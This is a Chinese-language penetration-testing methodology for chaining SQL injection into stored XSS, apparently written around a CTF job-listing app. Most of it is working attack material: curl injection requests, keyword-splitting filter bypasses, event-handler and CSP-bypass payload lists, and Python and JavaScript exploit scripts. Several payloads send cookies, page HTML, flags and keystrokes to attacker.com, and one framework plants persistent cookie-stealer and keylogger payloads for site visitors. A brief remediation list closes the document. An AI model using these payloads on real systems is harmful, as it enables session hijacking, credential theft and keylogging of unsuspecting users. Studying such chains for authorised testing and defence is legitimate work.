# 存储型 XSS 通过 SQL 注入链攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的存储型 XSS 通过 SQL 注入链攻击检测与利用流程，帮助发现和利用因 SQL 注入导致 XSS  payload 注入数据库，进而在前端渲染时执行恶意脚本的复合漏洞。

## 1.2 适用范围

本文档适用于以下场景：
- 数据库内容直接渲染到前端页面
- 使用 `innerHTML` 等危险方法渲染数据库内容
- 存在 SQL 注入漏洞且数据可在前端显示
- CTF 挑战应用中的复合漏洞场景

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

存储型 XSS 通过 SQL 注入链攻击是指攻击者首先利用 SQL 注入漏洞将恶意 JavaScript payload 注入到数据库中，当其他用户访问页面时，数据库中的恶意内容被直接渲染执行，从而实现 XSS 攻击。

**攻击链**：
```
SQL 注入入口 → UNION SELECT 注入 XSS payload → 数据库存储 → 前端渲染 → JavaScript 执行
```

**本质问题**：
- SQL 注入允许修改数据库内容
- 前端未对数据库内容进行 HTML 编码
- 使用 `innerHTML` 等危险方法渲染
- 缺少内容安全策略 (CSP)

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-79 | XSS（跨站脚本攻击） |
| CWE-89 | SQL 注入 |
| CWE-116 | HTML 编码不足 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 数据展示页面 | 用户列表/商品列表 | 数据库内容直接渲染 |
| 搜索结果页面 | 搜索结果显示 | 搜索结果显示数据库内容 |
| 详情页面 | 商品详情/用户详情 | 详情数据来自数据库 |
| 报表系统 | 数据报表展示 | 报表数据直接渲染 |
| CTF 挑战应用 | Flag 展示页面 | Flag 存储在数据库中 |

## 2.3 漏洞探测方法

### 2.3.1 XSS Sink 识别

**步骤 1：前端代码审计**

```javascript
// ❌ 危险模式 1：innerHTML 渲染数据库内容
data.forEach(job => {
    jobsTable += `
        <tr>
            <td>${job.id}</td>
            <td>${job.name}</td>
            <td>${job.type}</td>
            <td>${job.description}</td>
        </tr>
    `;
});
resultDiv.innerHTML = jobsTable;  // ← XSS Sink

// ❌ 危险模式 2：直接拼接 HTML
element.innerHTML = '<div>' + databaseContent + '</div>';

// ❌ 危险模式 3：document.write
document.write(databaseContent);
```

**步骤 2：数据流分析**

```
用户输入 (job_type 参数)
    ↓
SQL 查询 (存在注入漏洞)
    ↓
数据库返回结果 (JSON)
    ↓
前端 JavaScript 处理
    ↓
innerHTML 渲染  ← XSS Sink
```

### 2.3.2 SQL 注入点识别

```bash
# 测试 SQL 注入
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"'"}'

# 如果返回 500 错误，可能存在 SQL 注入

# 测试 UNION 注入
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNION SELECT 1,2,3,4--"}'
```

### 2.3.3 自动化检测脚本

```python
#!/usr/bin/env python3
"""
存储型 XSS 通过 SQL 注入链检测脚本
"""

import requests
import json

BASE_URL = 'http://target.com/jobs'

def test_xss_chain():
    """测试 XSS 通过 SQL 注入链"""
    
    # XSS Payload 库（选择不含 'or' 的事件处理器）
    xss_payloads = [
        '<details open ontoggle=alert(1)>XSS</details>',
        '<svg onload=alert(1)>',
        '<img src=x onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<marquee onstart=alert(1)>',
    ]
    
    # SQL 注入前缀（绕过黑名单）
    sql_prefixes = [
        "' UNUNIONION SELSELECTECT",
        "' oR",
    ]
    
    for prefix in sql_prefixes:
        for payload in xss_payloads:
            # 构建完整 Payload
            # 注入到 name 字段
            full_payload = f'{prefix} 999,\'{payload}\',\'xss\',\'test\' as description--'
            
            response = requests.post(
                BASE_URL,
                json={'job_type': full_payload},
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                data = response.json()
                # 检查 payload 是否在响应中
                if payload in str(data):
                    print(f"[✓] Payload delivered successfully!")
                    print(f"    Prefix: {prefix}")
                    print(f"    Payload: {payload}")
                    print(f"    Response: {data}")
                    return True
                else:
                    print(f"[?] Payload may be filtered: {payload}")
            else:
                print(f"[✗] Request failed: {response.status_code}")
    
    return False

if __name__ == '__main__':
    if test_xss_chain():
        print("\n[SUCCESS] XSS via SQL injection chain confirmed!")
    else:
        print("\n[FAILED] Could not confirm XSS chain")
```

## 2.4 漏洞利用方法

### 2.4.1 基础 XSS 注入

```bash
# 场景：数据库内容通过 innerHTML 渲染
# 目标：注入 XSS payload 到 name 或 description 字段

# Payload 1：使用 <details> ontoggle 事件（不含 'or'）
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNIONION SELSELECTECT 999,'\''<details open ontoggle=alert(document.domain)>XSS</details>'\'','\''xss'\'','\''payload'\'' as description--"}'

# Payload 2：使用 <svg> onload 事件
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNIONION SELSELECTECT 999,'\''<svg onload=alert(1)>'\'','\''xss'\'','\''payload'\'' as description--"}'

# Payload 3：使用 <input> onfocus 事件
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNIONION SELSELECTECT 999,'\''<input autofocus onfocus=alert(1)>'\'','\''xss'\'','\''payload'\'' as description--"}'
```

### 2.4.2 敏感数据窃取

```bash
# 场景：页面中包含敏感数据（如 CTF Flag）
# 目标：使用 XSS 窃取 Flag

# Payload：窃取页面中的 Flag 并外带
PAYLOAD='<img src=x onload="fetch(window.location).then(r=>r.text()).then(t=>{const m=t.match(/flag\{.*?\}/);if(m)fetch(\"http://attacker.com/exfil?data=\"+encodeURIComponent(m[0]))})">'

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d "{\"job_type\": \"' UNUNIONION SELSELECTECT 999,'$PAYLOAD','xss','payload' as description--\"}"
```

### 2.4.3 完整利用脚本

```python
#!/usr/bin/env python3
"""
存储型 XSS 通过 SQL 注入链 - 完整利用脚本
窃取 CTF Flag
"""

import requests
import urllib.parse

BASE_URL = 'http://target.com/jobs'
ATTACKER_SERVER = 'http://attacker.com'

def steal_flag():
    """窃取 Flag"""
    
    # XSS Payload：提取页面中的 Flag 并外带
    xss_payload = '''<img src=x onload="fetch(window.location).then(r=>r.text()).then(t=>{const m=t.match(/flag\\{.*?\\}/);if(m)fetch("''' + ATTACKER_SERVER + '''/exfil?data="+encodeURIComponent(m[0]))})">'''
    
    # SQL 注入 Payload
    sql_payload = f"' UNUNIONION SELSELECTECT 999,'{xss_payload}','xss','payload' as description--"
    
    # 发送请求
    response = requests.post(
        BASE_URL,
        json={'job_type': sql_payload},
        headers={'Content-Type': 'application/json'}
    )
    
    if response.status_code == 200:
        print("[+] XSS payload delivered")
        print(f"[+] Response: {response.text[:200]}")
        
        # 如果 Flag 直接在响应中，提取它
        import re
        flag_match = re.search(r'flag\{[a-f0-9-]+\}', response.text)
        if flag_match:
            print(f"[SUCCESS] Flag captured: {flag_match.group(0)}")
            return flag_match.group(0)
    else:
        print(f"[-] Request failed: {response.status_code}")
    
    return None

def session_hijack():
    """会话劫持（如果存在认证）"""
    
    # XSS Payload：窃取 Cookie 并外带
    xss_payload = f'<img src=x onmouseover="fetch(\'{ATTACKER_SERVER}/steal?c=\'+document.cookie)">'
    
    sql_payload = f"' UNUNIONION SELSELECTECT 999,'{xss_payload}','xss','payload' as description--"
    
    response = requests.post(
        BASE_URL,
        json={'job_type': sql_payload},
        headers={'Content-Type': 'application/json'}
    )
    
    print("[+] Session hijack payload delivered")
    print("[+] Wait for victim to visit page...")

def keylogger():
    """键盘记录"""
    
    # XSS Payload：键盘记录
    xss_payload = f'''<script>
document.onkeypress = function(e) {{
    fetch('{ATTACKER_SERVER}/log?key=' + e.key);
}}
</script>'''
    
    sql_payload = f"' UNUNIONION SELSELECTECT 999,'{xss_payload}','xss','payload' as description--"
    
    response = requests.post(
        BASE_URL,
        json={'job_type': sql_payload},
        headers={'Content-Type': 'application/json'}
    )
    
    print("[+] Keylogger payload delivered")

if __name__ == '__main__':
    print("[*] Starting XSS via SQL injection attack...\n")
    
    # 方法 1：直接窃取 Flag
    flag = steal_flag()
    if flag:
        print(f"\n[SUCCESS] Captured Flag: {flag}")
    
    # 方法 2：会话劫持
    # session_hijack()
    
    # 方法 3：键盘记录
    # keylogger()
```

### 2.4.4 无认证系统 XSS 利用

**场景描述**：当应用无认证机制时，所有端点公开访问

```bash
# 步骤 1：确认无认证
curl -v http://target.com/jobs
# 如果返回 200 且无 401/403/重定向，说明无认证

# 步骤 2：直接提交 XSS Payload
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' UNUNIONION SELSELECTECT 999,'\''<details open ontoggle=alert(document.domain)>'\'','\''xss'\'','\''payload'\'' as description--"}'

# 步骤 3：受害者访问页面时触发 XSS
# 任何访问 /jobs 端点的用户都会执行恶意脚本
```

### 2.4.5 浏览器端利用脚本

```javascript
// 攻击者托管的恶意页面
// hosted at: http://attacker.com/exploit.html

async function exploit() {
    // 步骤 1：向目标应用注入 XSS payload
    const response = await fetch('http://target.com/jobs', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            job_type: "' UNUNIONION SELSELECTECT 999,'<img src=x onload=fetch(\"http://attacker.com/steal?d=\"+document.documentElement.innerHTML)>','xss','payload' as description--"
        })
    });
    
    // 步骤 2：诱导受害者访问目标页面
    // 当受害者访问 http://target.com/ 时，XSS payload 执行
    // 页面内容被外带到 attacker.com
    
    console.log("[+] XSS payload injected");
    console.log("[+] Waiting for victim...");
}

exploit();
```

## 2.5 漏洞利用绕过方法

### 2.5.1 SQL 过滤器绕过

**场景**：SQL 注入过滤器同时影响 XSS payload

```bash
# 问题：过滤器移除 'or'，破坏 onerror 等事件处理器
# 解决：使用不含 'or' 的事件处理器

# ❌ 被过滤：onerror -> onerr
<img src=x onerror=alert(1)>

# ✅ 可用：ontoggle, onload, onfocus, onmouseover
<details open ontoggle=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<img src=x onmouseover=alert(1)>
```

### 2.5.2 事件处理器选择

```html
<!-- 不含 'or' 的事件处理器 -->
<details open ontoggle=alert(1)>
<svg onload=alert(1)>
<img src=x onload=alert(1)>
<input autofocus onfocus=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<video onplay=alert(1)>
<audio onplay=alert(1)>
<div onanimationend=alert(1)>
<div ontransitionend=alert(1)>
<form onsubmit=alert(1)>
<select onchange=alert(1)>
<textarea onfocus=alert(1) autofocus>
```

### 2.5.3 编码绕过

```bash
# HTML 实体编码
# &lt;details open ontoggle=alert(1)&gt;

# URL 编码
# %3Cdetails%20open%20ontoggle%3Dalert(1)%3E

# Unicode 编码
# \u003cdetails open ontoggle=alert(1)\u003e
```

### 2.5.4 CSP 绕过

```bash
# 如果存在 CSP，尝试以下绕过

# 方法 1：使用内联事件处理器（如果未禁用）
<img src=x onerror=alert(1)>

# 方法 2：使用 data: URI
<img src="data:text/html,<script>alert(1)</script>">

# 方法 3：利用宽松 CSP
# 如果 CSP 包含 'unsafe-inline'，直接注入 <script>
<script>alert(1)</script>
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| Payload 类型 | Payload 示例 | 适用场景 |
|------------|------------|---------|
| 基础 XSS | `<details open ontoggle=alert(1)>` | 通用测试 |
| 数据外带 | `<img src=x onload=fetch('//attacker.com/?c='+document.cookie)>` | Cookie 窃取 |
| Flag 窃取 | `<img src=x onload=fetch(window.location).then(r=>r.text()).then(t=>fetch('//attacker.com/?'+t.match(/flag{.*?}/)[0]))>` | CTF Flag |
| 键盘记录 | `<script>document.onkeypress=e=>fetch('//attacker.com/?k='+e.key)</script>` | 凭证窃取 |
| 钓鱼攻击 | `<form action="//attacker.com/steal"><input name=p></form>` | 凭证钓鱼 |

## 3.2 自动化利用脚本

```python
#!/usr/bin/env python3
"""
存储型 XSS 通过 SQL 注入链 - 自动化利用框架
"""

import requests
import re

class XSSViaSQLInjection:
    def __init__(self, target_url, param='job_type'):
        self.target_url = target_url
        self.param = param
        self.session = requests.Session()
        
        # Payload 库
        self.xss_payloads = {
            'alert': '<details open ontoggle=alert(document.domain)>XSS</details>',
            'cookie_steal': '<img src=x onload="fetch(\'//attacker.com/steal?c=\'+document.cookie)">',
            'dom_dump': '<img src=x onload="fetch(\'//attacker.com/dump?d=\'+encodeURIComponent(document.documentElement.innerHTML))">',
            'keylogger': '<script>document.onkeypress=e=>fetch(\'//attacker.com/log?k=\'+e.key)</script>',
        }
    
    def inject_payload(self, payload_name):
        """注入指定 Payload"""
        xss = self.xss_payloads[payload_name]
        
        # 构建 SQL 注入 Payload
        sql_payload = f"' UNUNIONION SELSELECTECT 999,'{xss}','xss','{payload_name}' as description--"
        
        response = self.session.post(
            self.target_url,
            json={self.param: sql_payload},
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print(f"[+] {payload_name} payload injected successfully")
            return True
        else:
            print(f"[-] Failed to inject {payload_name}")
            return False
    
    def extract_flag(self):
        """提取页面中的 Flag"""
        response = self.session.post(
            self.target_url,
            json={self.param: "' UNUNIONION SELSELECTECT id,name,type,description FRFROMOM jobs--"},
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            data = response.json()
            for record in data:
                desc = record.get('description', '')
                flag_match = re.search(r'flag\{[a-f0-9-]+\}', desc)
                if flag_match:
                    print(f"[SUCCESS] Flag found: {flag_match.group(0)}")
                    return flag_match.group(0)
        
        return None
    
    def run_full_attack(self):
        """执行完整攻击链"""
        print("[*] Starting XSS via SQL injection attack chain...\n")
        
        # 步骤 1：注入 Alert payload 确认漏洞
        print("[*] Step 1: Testing basic XSS...")
        self.inject_payload('alert')
        
        # 步骤 2：提取 Flag
        print("\n[*] Step 2: Extracting flag...")
        flag = self.extract_flag()
        if flag:
            print(f"[SUCCESS] Flag: {flag}")
        
        # 步骤 3：注入持久化 Payload
        print("\n[*] Step 3: Injecting persistent payloads...")
        self.inject_payload('cookie_steal')
        self.inject_payload('keylogger')
        
        print("\n[+] Attack chain complete!")
        print("[+] Wait for victims to visit the page...")

if __name__ == '__main__':
    attacker = XSSViaSQLInjection('http://target.com/jobs')
    attacker.run_full_attack()
```

## 3.4 修复建议

1. **修复 SQL 注入** - 使用参数化查询
2. **输出编码** - 对数据库内容进行 HTML 编码
3. **使用 textContent** - 替代 innerHTML
4. **实施 CSP** - 限制脚本执行来源
5. **输入验证** - 白名单验证用户输入

---

**参考资源**：
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [XSS Payloads](https://github.com/payloadbox/xss-payload-list)
